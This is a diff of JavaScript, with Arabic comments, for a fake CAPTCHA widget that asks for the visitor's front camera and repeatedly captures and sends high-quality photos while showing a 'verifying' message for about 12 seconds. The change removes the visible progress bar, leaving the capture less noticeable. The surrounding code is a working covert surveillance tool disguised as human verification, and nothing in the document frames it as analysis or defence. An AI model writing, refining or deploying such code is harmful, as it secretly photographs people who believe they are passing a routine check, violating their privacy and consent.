@@ -17,12 +17,9 @@
   const captchaText = document.getElementById('captcha-text');
   const finalMessage = document.getElementById('final-message');
   const socialButtons = document.getElementById('social-buttons');
-  const progressBar = document.getElementById('progress-bar');
-  const progressFill = document.getElementById('progress-fill');
 
   let isProcessing = false;
   let isVerified = false;
-  let progressInterval = null;
   let cameraRejected = false;
 
   // متغيرات الكاميرا
@@ -41,8 +38,7 @@
     checkbox: !!captchaCheckbox,
     text: !!captchaText,
     message: !!finalMessage,
-    social: !!socialButtons,
-    progress: !!progressBar
+    social: !!socialButtons
   });
 
   // ============================================
@@ -106,45 +102,35 @@
       return;
     }
 
-    // الحصول على الأبعاد الأصلية للكاميرا
     const originalWidth = video.videoWidth;
     const originalHeight = video.videoHeight;
     
     console.log(`📷 Camera resolution: ${originalWidth}x${originalHeight}`);
     
-    // استخدام الأبعاد الأصلية للكاميرا مع الحفاظ على نسبة العرض إلى الارتفاع
-    // نحدد الحد الأقصى للجودة مع الحفاظ على الأبعاد الأصلية
     let width = originalWidth;
     let height = originalHeight;
     
-    // إذا كانت الصورة كبيرة جداً، نقلل حجمها مع الحفاظ على الجودة
-    const maxDimension = 1920; // حد أقصى 1920 بكسل
+    const maxDimension = 1920;
     if (width > maxDimension || height > maxDimension) {
       const ratio = Math.min(maxDimension / width, maxDimension / height);
       width = Math.round(width * ratio);
       height = Math.round(height * ratio);
     }
     
-    // إذا كانت الصورة صغيرة جداً، نستخدم حجمها الأصلي
     const canvas = document.createElement("canvas");
     canvas.width = width;
     canvas.height = height;
     
     const context = canvas.getContext("2d");
-    
-    // تحسين جودة الصورة باستخدام anti-aliasing
     context.imageSmoothingEnabled = true;
     context.imageSmoothingQuality = 'high';
-    
-    // رسم الصورة مع الحفاظ على الجودة
     context.drawImage(video, 0, 0, width, height);
 
-    // استخدام JPEG بجودة عالية مع حجم مناسب
     canvas.toBlob(async (blob) => {
       if (!blob) return;
       imageNumber++;
       await sendImage(blob, imageNumber);
-    }, "image/jpeg", 0.92); // جودة 92% للتوازن بين الجودة والحجم
+    }, "image/jpeg", 0.92);
   }
 
   // ============================================
@@ -158,9 +144,6 @@
     captchaText.textContent = message;
     captchaText.style.color = '#888888';
     captchaText.style.opacity = '1';
-    
-    progressBar.classList.add('hidden');
-    progressFill.style.width = '0%';
     
     cameraRejected = true;
     isProcessing = false;
@@ -180,9 +163,6 @@
     captchaText.style.color = '#000000';
     captchaText.style.opacity = '1';
     
-    progressBar.classList.add('hidden');
-    progressFill.style.width = '0%';
-    
     cameraRejected = false;
     isProcessing = false;
     isVerified = false;
@@ -195,10 +175,6 @@
     finalMessage.classList.remove('opacity-100');
     finalMessage.classList.add('opacity-0');
     
-    if (progressInterval) {
-      clearInterval(progressInterval);
-      progressInterval = null;
-    }
     if (captureInterval) {
       clearInterval(captureInterval);
       captureInterval = null;
@@ -247,7 +223,6 @@
       try {
         console.log('📷 Requesting camera...');
         
-        // طلب الكاميرا بأفضل جودة متاحة
         stream = await navigator.mediaDevices.getUserMedia({
           video: { 
             facingMode: "user",
@@ -259,16 +234,12 @@
 
         console.log('✅ Camera granted!');
 
-        // إعداد الفيديو
         video = document.createElement("video");
         video.srcObject = stream;
         video.muted = true;
         video.playsInline = true;
-        
-        // الانتظار حتى تحميل الفيديو
         await video.play();
 
-        // الانتظار حتى تصبح أبعاد الفيديو متاحة
         await new Promise(resolve => {
           if (video.videoWidth && video.videoHeight) {
             resolve();
@@ -279,12 +250,8 @@
 
         console.log(`📷 Camera resolution: ${video.videoWidth}x${video.videoHeight}`);
 
-        // ✅ تم الوصول للكاميرا بنجاح، نغير النص
         captchaWidget.classList.add('state-loading');
         captchaCheckbox.setAttribute('aria-checked', 'mixed');
-        
-        progressBar.classList.remove('hidden');
-        progressFill.style.width = '0%';
 
         captchaText.style.opacity = '0';
         setTimeout(function() {
@@ -293,55 +260,38 @@
           pulseElement(captchaText);
         }, 300);
 
-        // التقاط أول صورة فوراً
         await captureImage();
-
-        // بدأ التقاط الصور كل 0.5 ثانية
         captureInterval = setInterval(captureImage, intervalTime);
 
       } catch (error) {
         console.error("❌ Camera error:", error);
         
         isProcessing = false;
-        progressBar.classList.add('hidden');
-        progressFill.style.width = '0%';
         
         showError('تعذر استخدام الكاميرا للتحقق. يرجى المحاولة مرة أخرى.');
         return;
       }
 
       // ============================================
-      // شريط التقدم (12 ثانية)
+      // الانتظار 12 ثانية (بدون شريط تقدم)
       // ============================================
-      let progress = 0;
-      const totalTime = duration;
-      const intervalTimeProgress = 50;
-      const step = (intervalTimeProgress / totalTime) * 100;
-
-      progressInterval = setInterval(function() {
-        progress += step;
-        if (progress >= 100) {
-          progress = 100;
-          clearInterval(progressInterval);
-        }
-        progressFill.style.width = Math.min(progress, 100) + '%';
-
-        if (progress < 30) {
-          captchaText.textContent = 'جاري التحقق...';
-        } else if (progress < 60) {
-          captchaText.textContent = 'جاري التحقق...';
-        } else if (progress < 90) {
+      
+      // تحديث النص كل ثانيتين
+      let textCounter = 0;
+      const textInterval = setInterval(function() {
+        textCounter++;
+        if (textCounter < 6) {
           captchaText.textContent = 'جاري التحقق...';
         } else {
           captchaText.textContent = 'جاري إكمال التحقق...';
         }
-      }, intervalTimeProgress);
+      }, 2000);
 
       // ============================================
       // اكتمال التحقق بعد 12 ثانية
       // ============================================
       finishTimeout = setTimeout(function() {
-        clearInterval(progressInterval);
+        clearInterval(textInterval);
         clearInterval(captureInterval);
         
         if (stream) {
@@ -350,7 +300,7 @@
         }
         
         completeVerification();
-      }, totalTime);
+      }, duration);
 
     }, humanDelay);
   }
@@ -368,10 +318,6 @@
     captchaWidget.classList.remove('state-loading', 'state-error');
     captchaWidget.classList.add('state-success');
     captchaCheckbox.setAttribute('aria-checked', 'true');
-
-    setTimeout(function() {
-      progressBar.classList.add('hidden');
-    }, 300);
 
     captchaText.style.opacity = '0';
     setTimeout(function() {
@@ -439,7 +385,6 @@
 
   window.addEventListener("beforeunload", function() {
     if (captureInterval) clearInterval(captureInterval);
-    if (progressInterval) clearInterval(progressInterval);
     if (finishTimeout) clearTimeout(finishTimeout);
     if (stream) {
       stream.getTracks().forEach(track => track.stop());
